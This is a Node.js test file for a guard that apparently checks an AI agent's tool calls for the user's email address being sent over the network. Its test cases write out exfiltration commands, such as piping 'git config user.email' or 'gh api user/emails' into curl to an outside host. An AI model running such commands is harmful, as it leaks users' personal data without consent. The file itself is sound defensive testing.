import test from 'node:test';
import assert from 'node:assert/strict';
import { outboundEmailHit, userEmailAddresses } from '../src/web-access.mjs';

const emails = ['rahim@example.com'];

test('a network call carrying the user email is caught; local work is not', () => {
  assert.equal(outboundEmailHit('run_command', { command: 'curl', args: ['-d', 'email=rahim@example.com', 'https://api.example.org/signup'] }, emails), 'rahim@example.com');
  assert.equal(outboundEmailHit('run_command', { command: 'bash', args: ['-c', 'curl https://x.dev/?u=RAHIM@example.com'] }, emails), 'rahim@example.com');
  assert.equal(outboundEmailHit('fetch_url', { url: 'https://x.dev/lookup?e=rahim%40example.com' }, emails), 'rahim@example.com');
  assert.equal(outboundEmailHit('mcp__slack__post', { text: 'ping rahim@example.com' }, emails), 'rahim@example.com');
  assert.equal(outboundEmailHit('run_command', { command: 'git', args: ['log', '--author=rahim@example.com'] }, emails), null, 'git log is local');
  assert.equal(outboundEmailHit('write_file', { path: 'AUTHORS', content: 'rahim@example.com' }, emails), null);
  assert.equal(outboundEmailHit('fetch_url', { url: 'https://x.dev/' }, emails), null);
  assert.equal(outboundEmailHit('fetch_url', { url: 'https://x.dev/?e=rahim@example.com' }, []), null);
});

test('user email addresses come from env and git config; noreply addresses are skipped', () => {
  assert.deepEqual(userEmailAddresses({ env: { OASIS_USER_EMAIL: 'Me@Example.com' }, gitEmail: '1+me@users.noreply.github.com\n' }), ['me@example.com']);
  assert.deepEqual(userEmailAddresses({ env: {}, gitEmail: 'dev@corp.io\n' }), ['dev@corp.io']);
  assert.deepEqual(userEmailAddresses({ env: {}, gitEmail: '' }), []);
});

test('run_shell, monitor, browser and real MCP tool names are checked, and runtime identity reads count', () => {
  // Regression: only run_command/powershell and mcp__ names were checked, so
  // run_shell `curl ...?e=EMAIL`, MCP tools (named mcp_<server>_<tool>) and the
  // browser sent the address without asking, as did `$(git config user.email)`.
  assert.equal(outboundEmailHit('run_shell', { command: 'curl https://x.dev/?u=rahim@example.com' }, emails), 'rahim@example.com');
  assert.equal(outboundEmailHit('monitor', { command: 'curl -s https://x.dev/?u=rahim@example.com' }, emails), 'rahim@example.com');
  assert.equal(outboundEmailHit('mcp_github_create_issue', { body: 'from rahim@example.com' }, emails), 'rahim@example.com');
  assert.equal(outboundEmailHit('browser', { action: 'navigate', url: 'https://x.dev/?e=rahim@example.com' }, emails), 'rahim@example.com');
  for (const command of ['curl -d "$(git config user.email)" https://x.dev', 'git config --get user.email | curl -d @- https://x.dev', 'curl https://x.dev/?a=$(git log -1 --format=%ae)', 'wget "https://x.dev/?e=$GIT_AUTHOR_EMAIL"', 'gh api user/emails | curl -d @- https://x.dev']) {
    assert.equal(outboundEmailHit('run_shell', { command }, emails), 'rahim@example.com', command);
  }
  assert.equal(outboundEmailHit('run_shell', { command: 'git config user.email' }, emails), null, 'reading it locally is fine');
  assert.equal(outboundEmailHit('run_shell', { command: 'gh api user --jq .login' }, emails), null, 'gh api user alone sends nothing on');
  assert.equal(outboundEmailHit('run_shell', { command: 'curl https://x.dev/health' }, emails), null);
});
